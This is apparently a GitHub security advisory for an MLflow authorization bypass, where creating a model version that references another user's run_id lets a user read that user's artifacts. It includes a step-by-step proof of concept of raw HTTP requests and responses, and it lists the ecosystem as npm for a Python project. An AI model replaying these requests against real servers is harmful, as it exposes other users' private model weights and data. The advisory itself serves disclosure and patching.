# [H] MLflow: CreateModelVersion source validation does not check READ permission on referenced run_id

## Summary
Severity: High
Advisory: GHSA-gqch-g4w5-7qcw
CVE: CVE-2026-69148
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-gqch-g4w5-7qcw
Type: github-advisory

## Affected
- npm: `mlflow` — affected >=0 <3.15.0

## Details
### Summary

The `_validate_source_run` and `_validate_source_model` functions in `mlflow/server/handlers.py` verify that a model version source path is within the artifact directory of a specified run or logged model, but do not check whether the caller has READ permission on that run or model. An authenticated MLflow user can therefore reference another user's run_id in `CreateModelVersion`, creating a model version whose artifact URI points at the victim's artifact directory. If the calling user has MANAGE permission on the registered model (which they do after creation), they can then read arbitrary files from the victim's artifact directory via `GET /model-versions/get-artifact`, bypassing the experiment-level READ permission gate on `GET /get-artifact`.

### Details

`POST /api/2.0/mlflow/model-versions/create` is protected: the caller must have UPDATE permission on the registered model. However, the source/run_id validation performed inside `_validate_source_run` only verifies path containment, not caller authorization:

```python
# mlflow/server/handlers.py  _validate_source_run()
def _validate_source_run(source: str, run_id: str) -> None:
    if is_local_uri(source):
        if run_id:
            store = _get_tracking_store()
            run = store.get_run(run_id)          # <-- no permission check on run_id
            source = pathlib.Path(local_file_uri_to_path(source)).resolve()
            if is_local_uri(run.info.artifact_uri):
                run_artifact_dir = pathlib.Path(...).resolve()
                if run_artifact_dir in [source, *source.parents]:
                    return                       # validation passes
        raise MlflowException(...)
```

After creation, the model version's `source` and `run_id` point at the victim's artifact directory. The caller can read files from that directory via the model version artifact handler, which derives the artifact path from the stored `source`:

```
GET /model-versions/get-artifact?name=<model>&version=<v>&path=<file>
```

This bypass matters in deployments where experiment-level permissions are explicitly restricted -- i.e., where the default_permission is NO_PERMISSIONS or the target experiment has no grant for the attacker. Without the bypass, `GET /get-artifact` for the victim's run would return 403; via the model version artifact handler it returns 200.

### PoC

Prerequisites: MLflow v3.13.0, `--app-name basic-auth`, default_permission=NO_PERMISSIONS (or alice's experiment restricted). Alice owns experiment 2 and run ALICE_RUN_ID. Bob owns experiment 4. Bob has READ on his own resources but NOT on alice's experiment.

1. Alice uploads a private file:

```bash
# file is at /mlruns/2/ALICE_RUN_ID/artifacts/secret_weights.txt
echo "ALICE_SECRET_MODEL_WEIGHTS=0.42" > secret_weights.txt
```

2. Bob directly tries to read alice's artifact -- blocked:

```
GET /get-artifact?run_id=ALICE_RUN_ID&path=secret_weights.txt HTTP/1.1
Authorization: Basic <bob credentials>
```

Response: HTTP 403 (when alice's experiment is private)

3. Bob creates a model version referencing alice's run_id as source anchor:

```
POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Authorization: Basic <bob credentials>
Content-Type: application/json

{"name":"bob-model","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"}
```

Response: HTTP 200
```json
{"model_version":{"name":"bob-model","version":"1","source":"/mlruns/2/ALICE_RUN_ID/artifacts","run_id":"ALICE_RUN_ID"}}
```

4. Bob reads alice's private file via the model version artifact handler:

```
GET /model-versions/get-artifact?name=bob-model&version=1&path=secret_weights.txt HTTP/1.1
Authorization: Basic <bob credentials>
```

Response: HTTP 200 -- body contains `ALICE_SECRET_MODEL_WEIGHTS=0.42`

Live-validated on v3.13.0 with default_permission=READ (the file download is confirmed 200 OK); impact escalates to a true bypass when default_permission=NO_PERMISSIONS.

### Impact

An authenticated user who can create registered models can read arbitrary files from any other user's artifact directory, bypassing the experiment-level READ permission gate. Model weights, training data samples, and evaluation reports stored in a run's artifact directory are accessible. The attacker needs UPDATE (or MANAGE) permission on at least one registered model; with default_permission=READ, that is automatically granted to the model creator.

## References
- https://github.com/mlflow/mlflow/security/advisories/GHSA-gqch-g4w5-7qcw
- https://github.com/mlflow/mlflow/pull/24293
- https://github.com/mlflow/mlflow/commit/4bb7474771c3be808cd9e129defef9305f2869be
- https://github.com/mlflow/mlflow
- https://github.com/mlflow/mlflow/releases/tag/v3.15.0
